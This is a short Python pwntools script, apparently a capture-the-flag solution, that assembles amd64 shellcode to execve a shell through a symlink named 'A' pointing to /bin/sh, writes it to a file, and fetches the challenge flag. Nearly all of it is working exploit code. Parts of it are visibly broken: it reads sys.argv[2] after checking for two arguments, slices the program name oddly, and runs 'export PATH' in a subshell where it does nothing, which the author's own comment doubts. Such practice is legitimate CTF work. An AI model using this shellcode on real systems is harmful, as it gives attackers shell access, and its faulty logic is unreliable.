#!/usr/bin/env python

from pwn import *
import subprocess
import helpers
import pwn
import sys
import os

########################################################
# Setup                                                #
########################################################

# pwnlib forces objdump to use intel syntax, prevented by redefining 
# this function
pwnlib.asm._objdump = lambda *_: ['/usr/bin/x86_64-linux-gnu-objdump']

# get executable file name
prog = './'
if len(sys.argv) == 2:
  prog += sys.argv[2]
else:
  prog += os.path.basename(os.getcwd())
  prog = prog[:2] + prog[5:]

elf = ELF(prog)

# create a symlink and place '.' to PATH (no idea if this part works)
if os.path.exists('A'):
  subprocess.call('rm A', shell=True)
os.symlink('/bin/sh', 'A')
subprocess.call('export PATH=.:$PATH', shell=True)

########################################################
# Exploit                                              #
########################################################
arch = 'amd64'
shellcode = '''
    .att_syntax
    .att_mnemonic

    // '/bin/sh'
    push $0x41
    push %rsp 
    pop %rdi
    //mov %rsp, %rdi

    // other args
    push %rax
    pop %rsi
    cdq

    // execve
    push $0x3b
    pop %rax

    syscall
'''
compiled = asm(shellcode, arch=arch)

with open('shellcode.bin', 'wb') as f:
  f.write(compiled)

########################################################
# Execution                                            #
########################################################
# gets flag
flag = helpers.get_flag(elf, '')
pwn.info(f'Flag: {flag}')
